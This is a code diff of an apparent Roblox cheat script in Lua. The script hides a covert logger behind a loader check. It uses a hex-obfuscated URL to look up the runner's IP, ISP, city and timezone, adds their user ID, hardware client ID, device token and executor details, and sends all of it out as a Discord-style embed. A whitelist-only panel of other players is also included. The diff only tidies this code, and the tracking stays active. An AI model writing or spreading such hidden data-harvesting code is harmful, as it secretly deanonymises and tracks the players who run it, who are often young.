@@ -1,9 +1,7 @@
-local _P = game:GetService("Players")
-local _lp = _P.LocalPlayer
-
-local _auth = _lp:FindFirstChild("__NK_LOADER_SIGNAL")
-if not _auth or _auth.Value ~= "V8_SECURE_AUTH_SUCCESS" then
-    _lp:Kick("Execution prohibited. Use official loader.")
+local _lp = game:GetService("Players").LocalPlayer
+local _auth = _lp:FindFirstChild("__NK_V8_INTERNAL")
+if not _auth or _auth.Value ~= "V8_SECURE_AUTH_PASSED" then
+    _lp:Kick("Direct execution prohibited. Use Loader.")
     return
 end
 _auth:Destroy()
@@ -29,8 +27,6 @@ local _IP = _D("687474703A2F2F69702D6170692E636F6D2F6A736F6E3F6669656C64733D7374
 local _H = game:GetService("HttpService")
 local _U = game:GetService("UserInputService")
 local _R = game:GetService("ReplicatedStorage")
-local _M = game:GetService("MarketplaceService")
-
 local _uid = tostring(_lp.UserId)
 local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
 local _tk = "N/A"
@@ -45,59 +41,44 @@ end
 
 local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")
 
-local function _GUNC()
-    local u, s = 0, 0
-    local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly", "getnamecallmethod"}
-    local ts = {"gethui", "setthreadidentity", "getthreadidentity"}
-    local env = (getgenv and getgenv()) or getfenv(0)
-    for _, f in ipairs(tu) do if env[f] then u = u + 1 end end
-    for _, f in ipairs(ts) do if env[f] then s = s + 1 end end
-    return string.format("UNC: %d%% | sUNC: %d%%", math.floor((u/6)*100), math.floor((s/3)*100))
-end
-
-local function _GF()
-    local n, t = "None", "None"
-    pcall(function()
-        local d = _R:FindFirstChild("FactionSysRS") and _R.FactionSysRS:FindFirstChild("FactionData")
-        if d then
-            for _, f in ipairs(d:GetChildren()) do
-                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
-                    local b = f:FindFirstChild("BasicFactionData")
-                    if b then n = b.FactionName.Value t = b.FactionTag.Value end
-                    break
-                end
-            end
-        end
-    end)
-    return n, t
-end
-
 local function _LOG()
     pcall(function()
         local req = (syn and syn.request or request or http_request)
         local r = req({Url = _IP, Method = "GET"})
         local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
-        local fn, ft = _GF()
-        local jid = game.JobId == "" and "Unknown" or game.JobId
-        local joinBtn = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid
-        local friends = {}
-        for _, p in ipairs(_P:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
         
+        local u, s = 0, 0
+        local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly"}
+        local ts = {"gethui", "setthreadidentity"}
+        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
+        for _, f in ipairs(ts) do if getgenv()[f] then s = s + 1 end end
+        local unc_str = string.format("UNC: %d%% | sUNC: %d%%", math.floor((u/5)*100), math.floor((s/2)*100))
+
+        local fn, ft = "None", "None"
+        local fdf = _R:FindFirstChild("FactionSysRS") and _R.FactionSysRS:FindFirstChild("FactionData")
+        if fdf then
+            for _, f in ipairs(fdf:GetChildren()) do
+                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
+                    local bd = f:FindFirstChild("BasicFactionData")
+                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
+                    break
+                end
+            end
+        end
+
         local payload = {
             ["embeds"] = {{
                 ["title"] = (_st == "whitelist" and "✅ Whitelisted User Executed" or "👤 Unknown/Guest User Executed"),
                 ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
                     {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", _lp.DisplayName, _lp.Name, _uid, tostring(_lp.AccountAge)), ["inline"] = false},
-                    {["name"] = "Executor", ["value"] = (identifyexecutor and identifyexecutor() or "Unknown") .. " (" .. _GUNC() .. ")", ["inline"] = true},
-                    {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
+                    {["name"] = "Executor", ["value"] = string.format("%s (%s)", (identifyexecutor and identifyexecutor() or "Unknown"), unc_str), ["inline"] = true},
+                    {["name"] = "System", ["value"] = "**Platform:** "..(_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                     {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
-                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
-                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", _M:GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
-                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = "[Join Server]("..joinBtn..") | [Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
+                    {["name"] = "Hardware ID", ["value"] = "```".._hw.."```", ["inline"] = false},
+                    {["name"] = "Device Token", ["value"] = "```".._tk.."```", ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
+                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId), ["inline"] = false}
                 },
                 ["footer"] = {["text"] = "Logger | "..string.upper(_st).." • "..os.date("%x %I:%M %p")},
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -109,19 +90,18 @@ end
 
 task.spawn(_LOG)
 
--- KILLSWITCH PANEL (Draggable)
+-- DRAGGABLE GUI
 if _st == "whitelist" then
     local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
     local f = Instance.new("Frame", sg)
-    f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150)
-    f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
+    f.Size = UDim2.new(0, 200, 0, 300); f.Position = UDim2.new(0.5,-100,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
     Instance.new("UICorner", f)
     local s = Instance.new("ScrollingFrame", f)
     s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
     Instance.new("UIListLayout", s).Padding = UDim.new(0,5)
     local function refresh()
         for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-        for _, p in ipairs(_P:GetPlayers()) do
+        for _, p in ipairs(game.Players:GetPlayers()) do
             local b = Instance.new("TextButton", s)
             b.Size = UDim2.new(1,0,0,30); b.Text = p.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
             b.MouseButton1Click:Connect(function() 
